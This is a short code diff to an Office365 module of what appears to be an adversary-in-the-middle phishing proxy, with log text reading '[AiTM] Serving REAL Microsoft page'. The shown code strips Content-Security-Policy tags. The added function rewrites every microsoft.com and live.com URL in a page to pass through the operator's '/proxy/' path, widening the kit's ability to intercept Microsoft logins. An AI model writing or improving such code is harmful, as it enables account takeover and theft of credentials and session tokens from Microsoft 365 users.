@@ -969,6 +969,16 @@ class Office365Module(BaseModule):
                     # Remove any inline meta Content-Security-Policy tags to avoid CSP blocking
                     content_str = re.sub(r'<meta[^>]+http-equiv=["\"]Content-Security-Policy["\"][^>]*>', '', content_str, flags=re.IGNORECASE)
 
+                    # Broad regex-based rewrite for any direct Microsoft URLs we didn't explicitly list (handles df6.cfp.microsoft.com and others)
+                    def _rewrite(match):
+                        url = match.group(0)
+                        proto_removed = re.sub(r'^https?:\/\/', '', url)
+                        path_part = '/'.join(proto_removed.split('/')[1:])
+                        return f"https://{current_host}/proxy/{path_part}"
+
+                    pattern = r"https?:\/\/[A-Za-z0-9\-.]*(live\.com|microsoft\.com)/(?:[A-Za-z0-9_\-./?=&%+]*)"
+                    content_str = re.sub(pattern, _rewrite, content_str)
+
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
                     
